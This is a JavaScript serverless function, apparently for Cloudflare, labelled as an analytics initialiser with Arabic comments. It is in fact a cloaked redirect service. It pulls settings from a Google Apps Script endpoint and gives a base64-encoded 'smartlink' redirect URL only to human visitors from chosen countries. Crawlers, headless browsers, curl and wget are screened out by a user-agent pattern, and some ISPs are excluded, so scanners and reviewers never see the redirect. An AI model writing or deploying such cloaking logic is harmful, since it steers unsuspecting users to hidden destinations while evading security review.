// functions/api/analytics/init.js

const GOOGLE_SHEET_API = 'https://script.google.com/macros/s/AKfycbxI33sJG_R6_J0KGJHPZ5YBus4ctbO1Mgm9TsvSSxgdRQjfEWVhfonls8624tf_IkWO/exec'; // رابط V10

const corsHeaders = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'GET, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type',
};

const botPatterns = /bot|crawler|spider|headless|chrome-lighthouse|python|curl|wget|node-fetch/i;

export async function onRequestOptions() {
    return new Response(null, { status: 204, headers: corsHeaders });
}

export async function onRequestGet(context) {
    const request = context.request;
    const userAgent = request.headers.get('User-Agent') || '';
    
    // 🛡️ جدار الحماية الأول: حظر الروبوتات
    if (botPatterns.test(userAgent)) {
        return new Response(JSON.stringify({ s: 0, u: '', b: '', e: '' }), {
            status: 200, headers: { 'Content-Type': 'application/json', ...corsHeaders }
        });
    }

    try {
        const response = await fetch(`${GOOGLE_SHEET_API}?action=getConfig`);
        const data = await response.json();
        
        let isRedirectAllowed = false;

        // ✅ الشرط الأول: هل التحويل مفعل؟
        if (data.status === 'ON') {
            const visitorCountry = (request.cf?.country || 'Unknown').toUpperCase();
            const visitorIsp = (request.cf?.asOrganization || 'Unknown').toLowerCase();
            
            const targetCountries = (data.targetCountries || '').toUpperCase().split(',').map(c => c.trim()).filter(Boolean);
            const blockedIsps = (data.blockedIsps || '').toLowerCase().split(',').map(i => i.trim()).filter(Boolean);

            let isCountryAllowed = false;
            let isIspBlocked = false;

            // ✅ الشرط الثاني: فحص التصفية الجغرافية
            if (targetCountries.length === 0) {
                isCountryAllowed = true;
            } else if (targetCountries.includes(visitorCountry)) {
                isCountryAllowed = true;
            }

            // ✅ الشرط الثالث: فحص حظر الـ ISP/Carrier
            if (blockedIsps.length > 0) {
                for (const blocked of blockedIsps) {
                    if (visitorIsp.includes(blocked)) { // استخدام includes لمرونة الأسماء
                        isIspBlocked = true;
                        break;
                    }
                }
            }

            // القرار النهائي: مسموح إذا كانت الدولة مسموحة والـ ISP غير محظور
            if (isCountryAllowed && !isIspBlocked) {
                isRedirectAllowed = true;
            }
        }

        // تجهيز الرد
        if (isRedirectAllowed) {
            let encodedUrl = '';
            if (data.smartlinkUrl) { try { encodedUrl = btoa(data.smartlinkUrl); } catch(e) {} }

            return new Response(JSON.stringify({ 
                s: 1, u: encodedUrl, b: data.blockedReferrers || '', e: data.blockedExactReferrers || ''
            }), { status: 200, headers: { 'Content-Type': 'application/json', ...corsHeaders } });
        } else {
            return new Response(JSON.stringify({ s: 0, u: '', b: '', e: '' }), {
                status: 200, headers: { 'Content-Type': 'application/json', ...corsHeaders }
            });
        }

    } catch (error) {
        return new Response(JSON.stringify({ s: 0, u: '', b: '', e: '' }), {
            status: 500, headers: { 'Content-Type': 'application/json', ...corsHeaders }
        });
    }
}